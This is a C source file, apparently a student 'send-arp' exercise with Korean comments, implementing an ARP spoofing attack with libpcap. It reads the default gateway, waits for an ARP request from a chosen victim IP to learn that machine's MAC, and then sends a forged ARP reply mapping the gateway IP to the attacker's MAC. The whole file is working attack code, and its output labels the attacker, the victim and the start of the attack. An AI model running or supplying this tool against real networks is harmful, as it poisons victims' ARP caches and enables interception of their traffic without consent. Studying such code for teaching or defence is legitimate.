#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <linux/if.h>

#include "ethernet.h"
#include "arp.h"
#include "mac.h"
#include "ip.h"

#define PCAP_ERRBUF_SIZE 256
typedef unsigned char u_char;


// 기본 사용법 출력
void usage() {
    printf("syntax: send-arp <interface> <target_ip>\n");
    printf("sample: send-arp wlan0 192.168.35.191\n");
}

// 지정한 인터페이스의 게이트웨이 IP 자동 추출
bool get_gateway_ip(const char* iface, char* gw_ip) {
    FILE* fp = fopen("/proc/net/route", "r");
    if (!fp) return false;

    char line[256], dev[IFNAMSIZ];
    unsigned long dst, gw;
    fgets(line, sizeof(line), fp); // 첫 줄 무시

    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%s %lx %lx", dev, &dst, &gw) == 3) {
            if (strcmp(dev, iface) == 0 && dst == 0) {
                struct in_addr addr;
                addr.s_addr = gw;
                strcpy(gw_ip, inet_ntoa(addr));
                fclose(fp);
                return true;
            }
        }
    }

    fclose(fp);
    return false;
}

// ARP Reply 패킷 만들어서 전송
void send_arp_reply(
    const uint8_t attacker_mac[6],
    const uint8_t victim_mac[6],
    const uint8_t gateway_ip[4],
    const uint8_t victim_ip[4],
    pcap_t* handle
) {
    uint8_t packet[42];
    struct ethernet_hdr* eth = (struct ethernet_hdr*)packet;
    struct arp_hdr* arp = (struct arp_hdr*)(packet + sizeof(struct ethernet_hdr));

    memcpy(eth->dst_mac, victim_mac, 6);
    memcpy(eth->src_mac, attacker_mac, 6);
    set_ether_type(eth, Arp);

    set_arp_basic(arp, ARP_HDR_ETHER, ARP_PRO_IP4, ARP_OP_REPLY);
    memcpy(arp->sender_mac, attacker_mac, 6);
    memcpy(arp->sender_ip,  gateway_ip, 4);
    memcpy(arp->target_mac, victim_mac, 6);
    memcpy(arp->target_ip,  victim_ip, 4);

    if (pcap_sendpacket(handle, packet, sizeof(packet)) == 0) {
        printf("[*] Sent ARP reply: spoofed gateway\n");
    } else {
        fprintf(stderr, "[-] pcap_sendpacket failed: %s\n", pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        usage();
        return 1;
    }

    const char* dev = argv[1];
    const char* target_ip_str = argv[2];
    uint8_t target_ip[4];

    if (inet_pton(AF_INET, target_ip_str, target_ip) != 1) {
        fprintf(stderr, "[-] Invalid target IP\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "[-] pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    // 게이트웨이 IP 얻기
    char gateway_ip_str[16];
    if (!get_gateway_ip(dev, gateway_ip_str)) {
        fprintf(stderr, "[-] Failed to get default gateway\n");
        return 1;
    }

    uint8_t gateway_ip[4];
    inet_pton(AF_INET, gateway_ip_str, gateway_ip);

    // 공격자 MAC/IP 얻기
    uint8_t attacker_mac[6];
    if (!get_mac_address(dev, attacker_mac)) {
        fprintf(stderr, "[-] Failed to get MAC\n");
        return 1;
    }

    char attacker_ip_str[16];
    if (!get_ip_address(dev, attacker_ip_str)) {
        fprintf(stderr, "[-] Failed to get IP\n");
        return 1;
    }

    // 타겟 MAC 얻기 (ARP 요청 대기)
    printf("[*] Waiting for ARP request from vicitim %s\n", target_ip_str);
    printf("============================================\n");
    uint8_t victim_mac[6];
    bool found = false;

    while (!found) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res <= 0) continue;

        const struct ethernet_hdr* eth = (const struct ethernet_hdr*)pkt;
        if (get_ether_type(eth) != Arp) continue;

        const struct arp_hdr* arp = (const struct arp_hdr*)(pkt + sizeof(struct ethernet_hdr));
        if (ntohs(arp->ar_op) != ARP_OP_REQUEST) continue;

        if (memcmp(arp->sender_ip, target_ip, 4) == 0) {
            memcpy(victim_mac, arp->sender_mac, 6);
            found = true;
        }
    }

    printf("[+] Get to target MAC. Attack Begin!\n");
    printf("============================================\n");

        // 정보 출력
    printf("[*] Attacker MAC: ");
    mac_print((Mac*)attacker_mac);
    printf("[*] Attacker IP : %s\n", attacker_ip_str);
    printf("============================================\n");
    printf("[*] Spoofing: %s(GW) -> %s(Victim)\n", gateway_ip_str, target_ip_str);
    printf("============================================\n");

    send_arp_reply(attacker_mac, victim_mac, gateway_ip, target_ip, handle);
    sleep(1);

    pcap_close(handle);
    return 0;
}
